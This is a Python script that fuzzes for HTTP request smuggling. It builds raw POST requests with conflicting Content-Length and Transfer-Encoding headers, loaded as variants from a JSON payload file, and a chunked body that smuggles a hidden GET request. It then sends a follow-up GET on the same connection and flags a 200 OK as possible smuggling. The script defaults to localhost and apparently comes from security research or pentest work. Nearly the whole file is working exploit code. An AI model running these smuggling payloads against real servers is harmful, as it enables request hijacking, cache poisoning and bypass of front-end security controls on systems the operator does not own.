import socket
import time
import json
import sys

# ANSI color codes
COLORS = {
    'RESET': '\033[0m',
    'RED': '\033[91m',
    'GREEN': '\033[92m',
    'YELLOW': '\033[93m',
    'BLUE': '\033[94m',
    'CYAN': '\033[96m',
    'MAGENTA': '\033[95m',
    'BOLD': '\033[1m',
    'UNDERLINE': '\033[4m',
}

def send_raw_http_request(host, port, request_data):
    """
    Sends a raw HTTP request over a socket and returns the response.

    Args:
        host (str): The target host (e.g., 'localhost').
        port (int): The target port (e.g., 9013).
        request_data (bytes): The complete raw HTTP request as bytes.

    Returns:
        bytes: The raw HTTP response received from the server.
    """
    try:
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5) # Set a timeout for connection and receiving data

        # Connect the socket to the port where the server is listening
        server_address = (host, port)
        print(f"Connecting to {server_address[0]} port {server_address[1]}...")
        sock.connect(server_address)

        # Send the request data
        print("\n--- Sending Request ---")
        try:
            print(request_data.decode('latin-1')) # Decode for printing, latin-1 handles all bytes
        except UnicodeDecodeError:
            print(f"{COLORS['YELLOW']}[Non-printable bytes in request data, printing hex representation]{COLORS['RESET']}")
            print(request_data.hex())
        sock.sendall(request_data)

        # Receive the response
        print("--- Receiving Response ---")
        response_buffer = []
        while True:
            # Receive small chunks of data
            data = sock.recv(4096)
            if data:
                response_buffer.append(data)
            else:
                # No more data, or connection closed by server
                break
        
        response = b''.join(response_buffer)
        try:
            print(response.decode('latin-1', errors='ignore')) # Decode for printing, ignore errors for potentially malformed data
        except UnicodeDecodeError:
            print(f"{COLORS['YELLOW']}[Non-printable bytes in response data, printing hex representation]{COLORS['RESET']}")
            print(response.hex())
        
        return response

    except socket.timeout:
        print(f"{COLORS['RED']}Error: Socket operation timed out.{COLORS['RESET']}")
        return b"TIMEOUT_ERROR"
    except ConnectionRefusedError:
        print(f"{COLORS['RED']}Error: Connection refused. Is the server running on the specified host and port?{COLORS['RESET']}")
        return b"CONNECTION_REFUSED_ERROR"
    except Exception as e:
        print(f"{COLORS['RED']}An unexpected error occurred: {e}{COLORS['RESET']}")
        return b"UNKNOWN_ERROR"
    finally:
        if 'sock' in locals() and sock:
            print("--- Closing Connection ---")
            sock.close()

def send_raw_http_requests_sequential(host, port, first_request_data, second_request_data):
    """
    Sends two raw HTTP requests sequentially over a single persistent connection.

    Args:
        host (str): The target host.
        port (int): The target port.
        first_request_data (bytes): The raw bytes of the first request.
        second_request_data (bytes): The raw bytes of the second request.
    """
    try:
        # Create a TCP/IP socket for persistent connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10) # Set a higher timeout for persistent connection
        server_address = (host, port)
        print(f"Establishing persistent connection to {server_address[0]} port {server_address[1]}...")
        sock.connect(server_address)
        print("Connection established.")

        # --- Send the first (smuggling) request ---
        print("\n--- Sending First Request (POST with malformed TE) ---")
        try:
            print(first_request_data.decode('latin-1'))
        except UnicodeDecodeError:
            print(f"{COLORS['YELLOW']}[Non-printable bytes in first request data, printing hex representation]{COLORS['RESET']}")
            print(first_request_data.hex())
        sock.sendall(first_request_data)

        # Read response for the first request
        print("--- Receiving Response for First Request ---")
        response_buffer_1 = []
        
        # Read until connection closes or a timeout
        while True:
            try:
                data = sock.recv(4096)
                if data:
                    response_buffer_1.append(data)
                else:
                    print(f"{COLORS['CYAN']}Server closed connection after first response (or end of data).{COLORS['RESET']}")
                    break # Server closed connection
                sock.settimeout(0.1) # Short timeout for subsequent recv calls to detect end of response
            except socket.timeout:
                print(f"{COLORS['YELLOW']}Timeout waiting for more data for first response. Proceeding to send second request.{COLORS['RESET']}")
                break # Timeout occurred, likely end of current response
            except Exception as e:
                print(f"{COLORS['RED']}Error during first response reception: {e}{COLORS['RESET']}")
                break

        response_1 = b''.join(response_buffer_1)
        try:
            print(response_1.decode('latin-1', errors='ignore'))
        except UnicodeDecodeError:
            print(f"{COLORS['YELLOW']}[Non-printable bytes in first response data, printing hex representation]{COLORS['RESET']}")
            print(response_1.hex())

        # --- Send the second (normal GET) request ---
        # Only send if the connection is still alive from the first response.
        # If the server closed the connection, this send will fail.
        try:
            print("\n--- Sending Second Request (Normal GET) ---")
            try:
                print(second_request_data.decode('latin-1'))
            except UnicodeDecodeError:
                print(f"{COLORS['YELLOW']}[Non-printable bytes in second request data, printing hex representation]{COLORS['RESET']}")
                print(second_request_data.hex())
            sock.sendall(second_request_data)

            # Read response for the second request
            print("--- Receiving Response for Second Request ---")
            response_buffer_2 = []
            sock.settimeout(5) # Reset timeout for the second request
            while True:
                data = sock.recv(4096)
                if data:
                    response_buffer_2.append(data)
                else:
                    break # Server closed connection
            response_2 = b''.join(response_buffer_2)
            
            # Print second response and check for 200 OK for smuggling detection
            response_str_2 = response_2.decode('latin-1', errors='ignore')
#            print(response_str_2) # Print the raw response first

            # Check if the second request received a 200 OK POSSIBLY REQUEST SMUGGLING
            if response_str_2.startswith("HTTP/1.1 200 OK"):
                print(f"{COLORS['GREEN']}{COLORS['BOLD']}!!! POTENTIAL REQUEST SMUGGLING DETECTED: Normal GET request received 200 OK !!!{COLORS['RESET']}")
            else:
                print(f"{COLORS['YELLOW']}Normal GET request did NOT receive 200 OK.{COLORS['RESET']}")

        except BrokenPipeError:
            print(f"{COLORS['RED']}Cannot send second request: Connection was already closed by the server.{COLORS['RESET']}")
        except Exception as e:
            print(f"{COLORS['RED']}Error during second request sending/reception: {e}{COLORS['RESET']}")

    except socket.timeout:
        print(f"{COLORS['RED']}Error: Socket operation timed out during connection or initial send.{COLORS['RESET']}")
    except ConnectionRefusedError:
        print(f"{COLORS['RED']}Error: Connection refused. Is the server running on the specified host and port?{COLORS['RESET']}")
    except Exception as e:
        print(f"{COLORS['RED']}An unexpected error occurred: {e}{COLORS['RESET']}")
    finally:
        if 'sock' in locals() and sock:
            print("--- Closing Persistent Connection ---")
            sock.close()

# --- Configuration ---
TARGET_HOST = 'localhost'
TARGET_PORT = 8080
PAYLOADS_FILE = '/home/kali/TA/NARSTv3/payloads/payloads.json'

# --- Fixed payload for the POST request body ---
# This is the "smuggled" content that follows the first HTTP headers
post_request_body_payload = b'1\r\nA\r\n0\r\n\r\nGET / HTTP/1.1\r\nX-Foo: Bar'
POST_BODY_CONTENT_LENGTH = len(post_request_body_payload) # Should be 37

# --- Normal GET Request (following the payload, on the same connection) ---
raw_get_request = f"""GET /404please HTTP/1.1\r
Host: {TARGET_HOST}:{TARGET_PORT}\r
Connection: keep-alive\r
\r
""".encode('latin-1')

def load_payloads(filename):
    """Loads payloads from a JSON file."""
    try:
        with open(filename, 'r') as f:
            data = json.load(f)
        return data.get('permute', [])
    except FileNotFoundError:
        print(f"{COLORS['RED']}Error: Payloads file '{filename}' not found.{COLORS['RESET']}", file=sys.stderr)
        return []
    except json.JSONDecodeError as e:
        print(f"{COLORS['RED']}Error decoding JSON from '{filename}': {e}{COLORS['RESET']}", file=sys.stderr)
        return []

# --- Main execution ---
if __name__ == "__main__":
    print(f"{COLORS['BOLD']}--- Starting HTTP Request Smuggling Test Script with JSON Payloads ---{COLORS['RESET']}")
    
    payloads = load_payloads(PAYLOADS_FILE)

    if not payloads:
        print(f"{COLORS['RED']}No payloads found or loaded. Exiting.{COLORS['RESET']}")
        sys.exit(1)

    for i, payload in enumerate(payloads):
        payload_type = payload.get('type', f'unknown_type_{i}')
        content_length_key = payload.get('content_length_key', 'Content-Length:')
        transfer_encoding_info = payload.get('transfer_encoding', {})
        te_key = transfer_encoding_info.get('te_key', 'Transfer-Encoding:')
        te_value = transfer_encoding_info.get('te_value', 'chunked')

        print(f"\n{COLORS['BLUE']}======== Testing Payload Type: {payload_type} ========{COLORS['RESET']}")

        # Construct the raw POST request dynamically
        # We need to ensure the \u000c or \u000b bytes are correctly inserted.
        # Python f-strings can handle this. Encoding to 'latin-1' later will convert
        # these Unicode characters to their single-byte equivalents.
        raw_post_request_headers = f"""POST / HTTP/1.1\r
Host: {TARGET_HOST}:{TARGET_PORT}\r
Connection: keep-alive\r
{content_length_key} {POST_BODY_CONTENT_LENGTH}\r
{te_key} {te_value}\r
\r
"""
        # Encode the headers to bytes using latin-1 to preserve control characters
        raw_post_request = raw_post_request_headers.encode('latin-1') + post_request_body_payload + b'\r\n'

        send_raw_http_requests_sequential(TARGET_HOST, TARGET_PORT, raw_post_request, raw_get_request)
        print(f"\n{COLORS['BLUE']}======== Finished Testing Payload Type: {payload_type} ========{COLORS['RESET']}\n")
        time.sleep(1) # Small pause between tests

    print(f"{COLORS['BOLD']}--- All Payload Tests Finished ---{COLORS['RESET']}")
